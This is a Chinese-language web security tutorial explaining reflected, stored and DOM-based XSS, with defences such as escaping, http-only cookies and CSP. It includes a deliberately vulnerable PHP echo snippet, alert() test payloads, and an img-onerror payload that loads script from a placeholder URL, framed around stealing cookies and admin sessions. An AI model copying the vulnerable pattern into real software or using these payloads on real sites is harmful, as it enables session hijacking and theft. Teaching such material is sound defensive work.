---
title: XSS 跨站脚本攻击
---

# {{ $frontmatter.title }}

::: tip
跨站脚本攻击 `XSS`，是最普遍的 `Web` 应用安全漏洞。这类漏洞能够使得攻击者嵌入恶意脚本代码到正常用户会访问到的页面中，当正常用户访问该页面时，则可导致嵌入的恶意脚本代码的执行，从而达到恶意攻击用户的目的。
:::

## 类型

- `反射型XSS`： 通过 `URL` 参数直接注入，攻击者事先制作好攻击链接,需要欺骗用户自己去点击链接才能触发 `XSS` 代码，所谓反射型 `XSS` 就是将恶意用户输入的 `js` 脚本，反射到浏览器执行。
- `存储型XSS`：代码是存储在服务器中的，如在个人信息或发表文章等地方，加入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，每当有用户访问该页面的时候都会触发代码执行，这种 `XSS` 非常危险，容易造成蠕虫，大量盗窃 `cookie`，也被称为 `持久型XSS`。
- `DOM型XSS`：类似于 `反射型XSS`，但这种 `XSS` 攻击的实现是通过对 `DOM树` 的修改而实现的。

## 原理

当动态页面中插入的内容含有这些特殊字符如 `<` 时，用户浏览器会将其误认为是插入了 `HTML` 标签，当这些 `HTML` 标签引入了一段 `JavaScript` 脚本时，这些脚本程序就将会在用户浏览器中执行。当这些特殊字符不能被动态页面检查或检查出现失误时，就将会产生 `XSS` 漏洞。

攻击者可以使用户在浏览器中执行其预定义的恶意脚本，劫持用户会话，插入恶意内容、重定向链接、使用恶意软件劫持用户浏览器等等。

1. 基于 `反射型XSS` 漏洞，欺骗用户点击以执行 `js` 代码，可以盗取 `cookie` 等。

```php
// 直接将输入打印到页面，造成XSS
<?php
$XssReflex = $_GET['i'];
echo $XssReflex;
```

```txt
<!-- 构造url，点击后就可以执行js代码 -->
http://127.0.0.1/xss.php?i=<script>alert("run javascript");</script>
```

2. 基于 `存储型XSS` 漏洞，将 `js` 代码存储于服务器数据库中，服务器直接查询数据库数据显示到页面，即造成 `XSS`
   最经典的 `存储型XSS` 漏洞是留言板，当用户 A 在留言板留言一段 `JS` 代码 `<script>alert("run javascript");</script>`,后端未经过滤直接存储到数据库，当正常用户浏览到他的留言后，这段 JS 代码就会被执行，可以借此来盗取 `cookie`。

```txt
graph LR
恶意用户A --> 构造JS代码
构造JS代码 --> 服务器数据库
服务器数据库 --> 正常用户B显示页面
服务器数据库 --> 正常用户C显示页面
服务器数据库 --> 正常用户...显示页面
正常用户B显示页面 --> 执行js盗取cookie
正常用户C显示页面 --> 执行js盗取cookie
正常用户...显示页面 --> 执行js盗取cookie
```

3. 基于 `DOM` 的型 `XSS` 漏洞类似于 `反射型XSS`，但其变化多端，总之一句话，各种姿势，各种插，只要能执行我的 `Js` ，利用 `<script>`、`<img>` 等标签允许跨域请求资源。

经典案例是可以将标签写入到软件的意见反馈中，当管理员查看留言的反馈即 `触发XSS`，传递 `cookie` 与后台管理地址后就可以登录到后台了。

```js
<script scr="js_url"></script>
```

```html
<img src=1 onerror=appendChild(createElement('script')).src='js_url' />
```

## 防御

- 在用户提交参数前，将提交的字符< 、>、&、" 、' 、+、/等进行转义，严格控制输出。
- 将输入转化为小写对比 `javascript:` ，若匹配则过滤。
- 将 `cookie` 设置为 `http-only`,`js` 脚本将无法读取到 `cookie` 信息。
- 纯前端渲染，明确 `innerText`、`setAttribute`、`style`，将代码与数据分隔开。
- 避免不可信的数据拼接到字符串中传递给这些 `API`，如 `DOM中` 的内联事件监听器，`location`、`onclick`、`onerror`、`onload`、`onmouseover`等，`<a>` 标签的 `href` 属性，`JavaScript` 的 `eval()`、`setTimeout()`、`setInterval()`等，都能把字符串作为代码运行。
- 对于不受信任的输入，都应该限定一个合理的长度。
- 严格的 `CSP`,禁止加载外域代码，禁止外域提交，禁止内联脚本执行等较为严格的方式。